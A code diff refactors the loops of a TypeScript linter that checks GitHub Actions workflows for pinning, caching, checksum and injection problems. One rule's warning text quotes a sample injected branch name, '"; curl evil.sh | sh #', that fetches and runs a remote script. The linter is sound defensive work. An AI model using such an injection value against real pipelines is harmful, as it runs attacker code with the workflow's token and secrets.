@@ -199,6 +199,14 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
             jobs: [[path.basename(path.dirname(rel)), doc.runs ?? {}]] as [string, Job][],
         })),
     ];
+    /** Every step of every job, with where it sits, so a step rule is one loop. */
+    const sourceSteps = stepSources.flatMap(({ rel, src, jobs }) =>
+        jobs.flatMap(([name, job]) => stepsOf(job).map((step) => ({ rel, src, name, step }))),
+    );
+    /** The same, for workflows alone, with the workflow each step is in. */
+    const workflowSteps = workflows.flatMap(({ rel, doc }) =>
+        jobsOf(doc).flatMap(([name, job]) => stepsOf(job).map((step) => ({ rel, doc, name, step }))),
+    );
 
     // ── 1. timeout-minutes on every job ─────────────────────────────────────
     for (const { rel, doc } of workflows) {
@@ -309,47 +317,37 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
                 );
                 continue;
             }
-            for (const runner of runners) {
-                if (runner.endsWith('-latest')) {
-                    fail(
-                        rel,
-                        `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
-                        "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
-                    );
-                }
+            for (const runner of runners.filter((label) => label.endsWith('-latest'))) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs on \`${runner}\` (line ${lineOf(src, runner)})`,
+                    "The `-latest` label is repointed at a new major on GitHub's schedule, taking the whole preinstalled toolchain with it — so a green pipeline starts failing, or starts linking a shipped binary against a different glibc, on a day you changed nothing. Pin the image, e.g. `ubuntu-24.04` or `macos-15`.",
+                );
             }
         }
     }
 
     // ── 6. npm ci, never npm install ────────────────────────────────────────
-    for (const { rel, src, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
-                    fail(
-                        rel,
-                        `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
-                        'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
-                    );
-                }
-            }
+    for (const { rel, src, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        if (/\bnpm\s+(?:i|install|add)\b(?![^\n]*\s-g\b)/.test(step.run)) {
+            fail(
+                rel,
+                `job \`${name}\` runs \`npm install\` (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
+                'install resolves the ranges afresh and rewrites package-lock.json to match, so CI validates a dependency tree no developer has. `npm ci` installs the lockfile exactly and fails on drift — which is the entire point of running it here.',
+            );
         }
     }
 
     // ── 7. cache: npm on setup-node ─────────────────────────────────────────
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
-                if (step.with?.cache !== 'npm') {
-                    fail(
-                        rel,
-                        `job \`${name}\` sets up Node without \`cache: npm\``,
-                        'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/setup-node@')) continue;
+        if (step.with?.cache !== 'npm') {
+            fail(
+                rel,
+                `job \`${name}\` sets up Node without \`cache: npm\``,
+                'Every run then re-downloads the whole dependency tree from the registry. Not a correctness problem, just a minute or two of every single run, forever.',
+            );
         }
     }
 
@@ -402,50 +400,42 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     }
 
     // ── 9. checkout pinned to workflow_run.head_sha ─────────────────────────
-    for (const { rel, doc } of workflows) {
+    for (const { rel, doc, name, step } of workflowSteps) {
         if (!isWorkflowRun(doc)) continue;
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
-                const ref = step.with?.ref;
-                if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
-                    fail(
-                        rel,
-                        `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
-                        // eslint-disable-next-line no-template-curly-in-string -- the fix quotes the expression to write into the workflow.
-                        'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so what ships is code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
-                    );
-                }
-            }
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('actions/checkout@')) continue;
+        const ref = step.with?.ref;
+        if (typeof ref !== 'string' || !ref.includes('workflow_run.head_sha')) {
+            fail(
+                rel,
+                `job \`${name}\` checks out ${typeof ref === 'string' && ref !== '' ? `\`${ref}\`` : 'the default ref'}`,
+                // eslint-disable-next-line no-template-curly-in-string -- the fix quotes the expression to write into the workflow.
+                'Under workflow_run the default is the branch HEAD at trigger time, not the commit the upstream run validated. They diverge exactly when commits land quickly — so what ships is code CI never saw. Pass `ref: ${{ github.event.workflow_run.head_sha }}`.',
+            );
         }
     }
 
     // ── 10. Image tags immutable ────────────────────────────────────────────
     let imagePushes = 0;
-    for (const { rel, doc } of workflows) {
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                const tags = step.with?.tags;
-                if (typeof tags !== 'string') continue;
-                imagePushes += 1;
-                for (const tag of tags
-                    .split(/[\n,]+/)
-                    .map((t) => t.trim())
-                    .filter(Boolean)) {
-                    if (tag.endsWith(':latest')) {
-                        fail(
-                            rel,
-                            `job \`${name}\` pushes \`${tag}\``,
-                            'A mutable tag: the running pod cannot be traced back to a commit, and a rollback has no earlier tag to name. Tag with the commit SHA.',
-                        );
-                    } else if (!/head_sha|github\.sha/.test(tag)) {
-                        fail(
-                            rel,
-                            `job \`${name}\` pushes \`${tag}\`, which does not contain a commit SHA`,
-                            'Every deploy must be traceable to the exact commit CI validated. Interpolate `github.event.workflow_run.head_sha` into the tag.',
-                        );
-                    }
-                }
+    for (const { rel, name, step } of workflowSteps) {
+        const tags = step.with?.tags;
+        if (typeof tags !== 'string') continue;
+        imagePushes += 1;
+        for (const tag of tags
+            .split(/[\n,]+/)
+            .map((t) => t.trim())
+            .filter(Boolean)) {
+            if (tag.endsWith(':latest')) {
+                fail(
+                    rel,
+                    `job \`${name}\` pushes \`${tag}\``,
+                    'A mutable tag: the running pod cannot be traced back to a commit, and a rollback has no earlier tag to name. Tag with the commit SHA.',
+                );
+            } else if (!/head_sha|github\.sha/.test(tag)) {
+                fail(
+                    rel,
+                    `job \`${name}\` pushes \`${tag}\`, which does not contain a commit SHA`,
+                    'Every deploy must be traceable to the exact commit CI validated. Interpolate `github.event.workflow_run.head_sha` into the tag.',
+                );
             }
         }
     }
@@ -453,47 +443,43 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     // ── 11. A BuildKit cache scope per image ────────────────────────────────
     /** scope -> the file and job that already claimed it. */
     const cacheScopes = new Map();
-    for (const { rel, doc } of workflows) {
-        for (const [name, job] of jobsOf(doc)) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.uses !== 'string' || !step.uses.startsWith('docker/build-push-action@')) continue;
-                const from = step.with?.['cache-from'];
-                const to = step.with?.['cache-to'];
-                if (typeof from !== 'string' || from === '' || typeof to !== 'string' || to === '') {
-                    fail(
-                        rel,
-                        `job \`${name}\` builds without \`cache-${typeof from === 'string' && from !== '' ? 'to' : 'from'}\``,
-                        'Every layer is rebuilt on every push, including any multi-GB download baked into the image. Use `type=gha,scope=<service>`.',
-                    );
-                    continue;
-                }
-                const scope = /scope=([^,\s]+)/.exec(to)?.[1];
-                if (scope === undefined) {
-                    fail(
-                        rel,
-                        `job \`${name}\` sets \`cache-to\` without a \`scope=\``,
-                        'Unscoped, every image shares one cache and each build evicts the others. Give each image its own scope.',
-                    );
-                    continue;
-                }
-                if (cacheScopes.has(scope)) {
-                    fail(
-                        rel,
-                        `job \`${name}\` reuses cache scope \`${scope}\` (also ${cacheScopes.get(scope)})`,
-                        'Two images writing one scope evict each other every run, so the cache is worse than none — it costs an upload to store what the next build discards.',
-                    );
-                } else {
-                    cacheScopes.set(scope, `${rel} job \`${name}\``);
-                }
-                const readScope = /scope=([^,\s]+)/.exec(from)?.[1];
-                if (from.includes('scope=') && readScope !== scope) {
-                    fail(
-                        rel,
-                        `job \`${name}\` reads cache scope \`${readScope}\` but writes \`${scope}\``,
-                        'The build never reads back what it wrote, so the cache is populated and never used.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of workflowSteps) {
+        if (typeof step.uses !== 'string' || !step.uses.startsWith('docker/build-push-action@')) continue;
+        const from = step.with?.['cache-from'];
+        const to = step.with?.['cache-to'];
+        if (typeof from !== 'string' || from === '' || typeof to !== 'string' || to === '') {
+            fail(
+                rel,
+                `job \`${name}\` builds without \`cache-${typeof from === 'string' && from !== '' ? 'to' : 'from'}\``,
+                'Every layer is rebuilt on every push, including any multi-GB download baked into the image. Use `type=gha,scope=<service>`.',
+            );
+            continue;
+        }
+        const scope = /scope=([^,\s]+)/.exec(to)?.[1];
+        if (scope === undefined) {
+            fail(
+                rel,
+                `job \`${name}\` sets \`cache-to\` without a \`scope=\``,
+                'Unscoped, every image shares one cache and each build evicts the others. Give each image its own scope.',
+            );
+            continue;
+        }
+        if (cacheScopes.has(scope)) {
+            fail(
+                rel,
+                `job \`${name}\` reuses cache scope \`${scope}\` (also ${cacheScopes.get(scope)})`,
+                'Two images writing one scope evict each other every run, so the cache is worse than none — it costs an upload to store what the next build discards.',
+            );
+        } else {
+            cacheScopes.set(scope, `${rel} job \`${name}\``);
+        }
+        const readScope = /scope=([^,\s]+)/.exec(from)?.[1];
+        if (from.includes('scope=') && readScope !== scope) {
+            fail(
+                rel,
+                `job \`${name}\` reads cache scope \`${readScope}\` but writes \`${scope}\``,
+                'The build never reads back what it wrote, so the cache is populated and never used.',
+            );
         }
     }
 
@@ -546,44 +532,35 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
     }
 
     // ── 14. No untrusted input spliced into a `run:` block ──────────────────
-    for (const { rel, src, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                for (const field of UNTRUSTED) {
-                    if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
-                    fail(
-                        rel,
-                        `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
-                        `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
-                    );
-                }
-            }
+    for (const { rel, src, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        for (const field of UNTRUSTED) {
+            if (!new RegExp(`\\$\\{\\{[^}]*\\b${field.replace(/\./g, '\\.')}\\b`).test(step.run)) continue;
+            fail(
+                rel,
+                `job \`${name}\` interpolates \`${field}\` into a \`run:\` script (line ~${lineOf(src, step.run.split('\n')[0] ?? '')})`,
+                `That expression is substituted into the script text before the shell parses it, so a branch or title of \`"; curl evil.sh | sh #\` executes with this workflow's token and secrets. Bind it through \`env:\` instead and reference "$VAR" — inside env it is a value, not source code.`,
+            );
         }
     }
 
     // ── 15. curl-installed binaries pinned and checksummed ──────────────────
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string' || !RELEASE_HOSTS.test(step.run)) continue;
-                const label =
-                    typeof step.name === 'string' && step.name !== '' ? `step "${step.name}"` : `job \`${name}\``;
-                if (!/\$\{?\w*(?:VERSION|_VER)\b/.test(step.run) && !/\/v?\d+\.\d+\.\d+\//.test(step.run)) {
-                    fail(
-                        rel,
-                        `${label} downloads a release asset from an unpinned URL`,
-                        'Without a version in the path it resolves to whatever is newest, so the toolchain changes under a pipeline nobody touched. Pin the version.',
-                    );
-                }
-                if (!/sha256sum|shasum|sha256/i.test(step.run)) {
-                    fail(
-                        rel,
-                        `${label} installs a downloaded binary without verifying a checksum`,
-                        'A pinned version names which release to fetch, not what that release contains — release assets can be replaced in place, and this one is piped into /usr/local/bin and then run. Record the sha256 next to the version and check it before installing.',
-                    );
-                }
-            }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string' || !RELEASE_HOSTS.test(step.run)) continue;
+        const label = typeof step.name === 'string' && step.name !== '' ? `step "${step.name}"` : `job \`${name}\``;
+        if (!/\$\{?\w*(?:VERSION|_VER)\b/.test(step.run) && !/\/v?\d+\.\d+\.\d+\//.test(step.run)) {
+            fail(
+                rel,
+                `${label} downloads a release asset from an unpinned URL`,
+                'Without a version in the path it resolves to whatever is newest, so the toolchain changes under a pipeline nobody touched. Pin the version.',
+            );
+        }
+        if (!/sha256sum|shasum|sha256/i.test(step.run)) {
+            fail(
+                rel,
+                `${label} installs a downloaded binary without verifying a checksum`,
+                'A pinned version names which release to fetch, not what that release contains — release assets can be replaced in place, and this one is piped into /usr/local/bin and then run. Record the sha256 next to the version and check it before installing.',
+            );
         }
     }
 
@@ -604,26 +581,22 @@ export function inspectPipeline(input: PipelineOptions = {}): PipelineInspection
         if (name !== undefined && name !== '') wsScripts.set(name, names);
     }
 
-    for (const { rel, jobs } of stepSources) {
-        for (const [name, job] of jobs) {
-            for (const step of stepsOf(job)) {
-                if (typeof step.run !== 'string') continue;
-                for (const [, ws, script = ''] of step.run.matchAll(NPM_RUN)) {
-                    const available = ws !== undefined ? wsScripts.get(ws) : rootScripts;
-                    if (available === undefined) {
-                        fail(
-                            rel,
-                            `job \`${name}\` runs \`npm -w ${ws} run ${script}\`, but there is no \`${ws}\` workspace`,
-                            `Declared workspaces: ${workspaces.join(', ')}.`,
-                        );
-                    } else if (!available.has(script)) {
-                        fail(
-                            rel,
-                            `job \`${name}\` runs \`npm run ${script}\`${ws !== undefined ? ` in \`${ws}\`` : ''}, which is not a script there`,
-                            'Renaming a script in package.json is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
-                        );
-                    }
-                }
+    for (const { rel, name, step } of sourceSteps) {
+        if (typeof step.run !== 'string') continue;
+        for (const [, ws, script = ''] of step.run.matchAll(NPM_RUN)) {
+            const available = ws !== undefined ? wsScripts.get(ws) : rootScripts;
+            if (available === undefined) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs \`npm -w ${ws} run ${script}\`, but there is no \`${ws}\` workspace`,
+                    `Declared workspaces: ${workspaces.join(', ')}.`,
+                );
+            } else if (!available.has(script)) {
+                fail(
+                    rel,
+                    `job \`${name}\` runs \`npm run ${script}\`${ws !== undefined ? ` in \`${ws}\`` : ''}, which is not a script there`,
+                    'Renaming a script in package.json is a one-line edit that breaks CI from a file nobody had open. The failure surfaces on the next push, at whatever step happened to reference it.',
+                );
             }
         }
     }
